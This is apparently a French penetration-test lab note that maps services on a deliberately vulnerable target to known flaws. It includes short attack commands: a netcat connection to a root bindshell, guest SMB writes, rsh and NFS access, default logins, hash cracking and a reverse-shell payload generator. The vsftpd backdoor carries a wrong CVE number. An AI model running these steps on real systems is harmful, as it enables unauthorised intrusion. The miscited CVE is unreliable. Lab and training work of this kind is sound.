# M-001 / 02 — Weaponization (identification vulns + payloads)

**Ticket** : Linear JES-8 — **Critere de fin** : matrice vulns completee (service → vuln → PoC → payload) + payloads generees et testees en lab + note de correlation.

## Principe

Correler **chaque** service/version identifie au recon avec ses vulnérabilités connues (CVE) ou ses configurations vulnérables. Une ligne de la matrice n'est valide que si un PoC a éte vérifié (meme passif : banner, version, comportement).

## Matrice des vulnérabilités (construite sur le scan réel du 2026-10-23)

> Le scan est la vérité, pas l'hypothèse : la ligne MSSQL 1433 de la matrice initiale est **invalidée** (pas de 1433 ouvert sur C1). Légende : ✅ exploité · ⏳ à tester · ❌ non exploitable (justifié) · 🔒 en attente.

| ID | Cible | Service/port | Vuln (CVE ou config) | PoC / verification | Statut |
|---|---|---|---|---|---|
| V-001 | C1 | FTP 21 — vsftpd 2.3.4 | Backdoor CVE-2011-4140 (`a] :)(` → shell) + anonyme (230) + msfadmin/msfadmin | `ftp` → login fichiers ✅ ; backdoor à tester | ⏳ shell |
| V-002 | C1 | Telnet 23 — telnetd | Pas de chiffrement + comptes lab (msfadmin) | `telnet` → login | ⏳ |
| V-003 | C1 | SMB 445/139 — Samba 3.0.20 | Guest **lecture + écriture ✅** (smb-test.txt) + signing désactivé + usermap_script (exec) | `smbclient //ip/tmp -N -c 'put/ls'` ; owner du fichier à confirmer (`ls -ln`) ; usermap à tester | ⏳ exec |
| V-004 | C1 | SSH 22 — OpenSSH 4.7p1 | Comptes lab (msfadmin → sudo) | `ssh msfadmin@ip` | ⏳ |
| V-005 | C1 | **1524 — bindshell** | **Shell root à l'écoute** (backdoor de l'image) | `nc -nv ip 1524` → `id` = **uid=0** | ✅ **ROOT C1** |
| V-006 | C1 | 3632 — distccd 4.2.4 | CVE-2004-2416 (injection hostname → exec) | exploit distcc | ⏳ |
| V-007 | C1 | 512/513/514 — rsh/rlogin | rsh distant (hosts.equiv) | `rsh ip id` | ⏳ |
| V-008 | C1 | MySQL 3306 — 5.0.51a | root/root **refusé à distance** (restriction hôte probable) | via shell C1 : `mysql -u root -proot` local + hash `mysql.user` → john | ⏳ local |
| V-009 | C1 | NFS 2049 + mountd (36734) | Partage NFS sans auth | `sudo mount -t nfs ip:/ /mnt` | ⏳ |
| V-010 | C1 | VNC 5900 — 3.3 | Auth faible / vide ? | `vncviewer ip:0` | ⏳ |
| V-011 | C1 | BIND 53 — 9.4.2 | Zone transfer (AXFR) | `dig axfr` → **refusé** | ❌ justifié |
| V-012 | C1 | PostgreSQL 5432 — 8.3 | postgres/postgres ? | `psql -h ip -U postgres` | ⏳ |
| V-013 | C1 | Tomcat 8180 (5.5) + AJP 8009 | Tomcat obsolète (manager/CVE), AJP wrap | `curl` manager | ⏳ |
| V-014 | C1 | ProFTPD 2121 — 1.3.1 | Anonyme / backdoor ? | `ftp -P 2121` | ⏳ |
| V-015 | C1 | 8787 — Ruby DRb 1.8 | Exécution distante DRb | exploit DRb | ⏳ |
| V-016 | C1 | SMTP 25 — Postfix | SSLv2 + VRFY (enum users) | `openssl s_client` / VRFY | ⏳ mineur |
| V-017 | C1 | IRC 6667 — UnrealIRCd 3.2.8 | DCC (enum, transfert) | client IRC | ⏳ mineur |
| V-018 | C1 | UDP (snmp 161, dns, rpc udp) | SNMP community publique ? | `nmap -sU --top-ports 50` + `snmpwalk` | ⏳ scan |
| V-019 | C2 | (à découvrir via pivot) | — | tunnel A→C1→C2 (JES-14) | 🔒 pivot |
| V-020 | C3 | — | **reportée → M-002** | — | reportée |

## Generation des payloads (lab uniquement)

Les payloads sont generes par `../../payloads/generate-payloads.py` (garde d'autorisation : lab seulement, reverse shells netcat simples, aucun dropper, aucun exfil) :

```bash
python3 ../../payloads/generate-payloads.py --lab-ip 192.168.56.10 --lab-port 4444 --out ../../payloads/generated/M-001/
```

Chaque payload genere est documente ici : usage, cible, resultat du test.

## Note de correlation (a rediger a la fin de la phase)

- [ ] Liste des vulns confirmees vs non exploitables (avec justification)
- [ ] Chaine recommandee d'exploitation (ordre, dependances)
- [ ] Risques residus / points a surveiller
